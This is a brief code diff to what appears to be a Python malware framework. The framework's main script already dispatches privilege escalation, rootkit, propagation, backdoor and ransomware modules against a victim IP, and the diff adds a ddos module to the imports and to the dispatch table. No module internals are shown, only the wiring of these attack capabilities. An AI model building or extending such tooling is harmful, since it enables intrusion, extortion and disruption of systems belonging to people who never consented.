@@ -7,6 +7,7 @@ import argparse
 import netifaces
 from time import sleep
 
+from modules import ddos
 from modules import privesc
 from modules import rootkit
 from modules import propagation
@@ -50,6 +51,7 @@ def main(start_module):
         "backdoor": lambda victim_ip, port: backdoor.run(victim_ip, port),
         "instructions": lambda victim_ip: instructions.run(victim_ip),
         "ransomware": ransomware.run,
+        "ddos": ddos.run,
     }
 
     print("[+] Modules initialized")
